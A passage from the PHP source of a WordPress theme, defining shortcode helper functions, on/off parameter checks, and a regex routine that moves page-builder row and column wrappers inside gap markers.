	}
}
if (!function_exists('axiom_welldone_theme_support_pt')) {
	function axiom_welldone_theme_support_pt($value, $params=false) {
		if (function_exists('trx_utils_theme_support_pt'))
			trx_utils_theme_support_pt($value, $params);
	}
}
if (!function_exists('axiom_welldone_theme_support_tx')) {
	function axiom_welldone_theme_support_tx($value, $params=false) {
		if (function_exists('trx_utils_theme_support_tx'))
			trx_utils_theme_support_tx($value, $params);
	}
}


	
/* Shortcodes utils
------------------------------------------------------------------------------------- */

// Add theme required shortcode
if (!function_exists('axiom_welldone_require_shortcode')) {
	function axiom_welldone_require_shortcode($name, $cb) {
		if (function_exists('trx_utils_require_shortcode'))
			trx_utils_require_shortcode( $name, $cb);
	}
}

// Return do_shortcode() if exists
if (!function_exists('axiom_welldone_do_shortcode')) {
	function axiom_welldone_do_shortcode($text) {
		$parts = explode(' ', $text, 2);
		if (axiom_welldone_substr($parts[0], 0, 5)!=='[trx_' || shortcode_exists(str_replace(array('[', ']'), array('', ''), $parts[0])))
			return do_shortcode($text);
		else
			return '';
	}
}

// Check params for "on" | "off" | "inherit" values
if (!function_exists('axiom_welldone_param_is_on')) {
	function axiom_welldone_param_is_on($prm) {
		return $prm>0 || in_array(axiom_welldone_strtolower($prm), array('true', 'on', 'yes', 'show'));
	}
}
if (!function_exists('axiom_welldone_param_is_off')) {
	function axiom_welldone_param_is_off($prm) {
		return empty($prm) || $prm===0 || in_array(axiom_welldone_strtolower($prm), array('false', 'off', 'no', 'none', 'hide'));
	}
}
if (!function_exists('axiom_welldone_param_is_inherit')) {
	function axiom_welldone_param_is_inherit($prm) {
		return in_array(axiom_welldone_strtolower($prm), array('inherit', 'default'));
	}
}

// Clear dedicated content
if (!function_exists('axiom_welldone_clear_dedicated_content')) {
	function axiom_welldone_clear_dedicated_content() {
		axiom_welldone_storage_set('sc_section_dedicated', '');
	}
}

// Return dedicated content
if (!function_exists('axiom_welldone_get_dedicated_content')) {
	function axiom_welldone_get_dedicated_content() {
		return axiom_welldone_storage_get('sc_section_dedicated');
	}
}

// Check if we are in the shortcode "trx_blogger" now
if (!function_exists('axiom_welldone_in_shortcode_blogger')) {
	function axiom_welldone_in_shortcode_blogger($from_blogger = false) {
		if (!$from_blogger) return false;
		return axiom_welldone_storage_get('sc_blogger_busy')===true;
	}
}

// Return GAP wrapper start
if (!function_exists('axiom_welldone_gap_start')) {
	function axiom_welldone_gap_start() {
		return '<!-- #TRX_GAP_START# -->';
	}
}

// Return GAP wrapper end
if (!function_exists('axiom_welldone_gap_end')) {
	function axiom_welldone_gap_end() {
		return '<!-- #TRX_GAP_END# -->';
	}
}


// Replace GAP wrapper in the content
if (!function_exists('axiom_welldone_gap_wrapper')) {
	function axiom_welldone_gap_wrapper($str) {
		// Move VC row and column and wrapper inside gap
		// Old VC wrappers
		$str_new = preg_replace('/(<div\s+class="[^"]*vc_row[^>]*>)[\r\n\s]*(<div\s+class="[^"]*vc_col[^>]*>)[\r\n\s]*(<div\s+class="[^"]*wpb_wrapper[^>]*>)[\r\n\s]*('.axiom_welldone_gap_start().')/i', '\\4\\1\\2\\3', $str);
		if ($str_new != $str) $str_new = preg_replace('/('.axiom_welldone_gap_end().')[\r\n\s]*(<\/div>)[\r\n\s]*(<\/div>)[\r\n\s]*(<\/div>)/i', '\\2\\3\\4\\1', $str_new);
		// New VC wrappers
		$str_new = preg_replace('/(<div\s+class="[^"]*vc_row[^>]*>)[\r\n\s]*(<div\s+class="[^"]*vc_col[^>]*>)[\r\n\s]*(<div\s+class="[^"]*vc_col[^>]*>)[\r\n\s]*(<div\s+class="[^"]*wpb_wrapper[^>]*>)[\r\n\s]*('.axiom_welldone_gap_start().')/i', '\\5\\1\\2\\3\\4', $str);
		if ($str_new != $str) $str_new = preg_replace('/('.axiom_welldone_gap_end().')[\r\n\s]*(<\/div>)[\r\n\s]*(<\/div>)[\r\n\s]*(<\/div>)[\r\n\s]*(<\/div>)/i', '\\2\\3\\4\\5\\1', $str_new);
		// Gap layout
		return str_replace(
				array(
					axiom_welldone_gap_start(),
					axiom_welldone_gap_end()
				),
				array(
					axiom_welldone_close_all_wrappers(false) . '<div class="sc_gap">',
					'</div>' . axiom_welldone_open_all_wrappers(false)
				),
				$str_new
			); 
	}
}
?>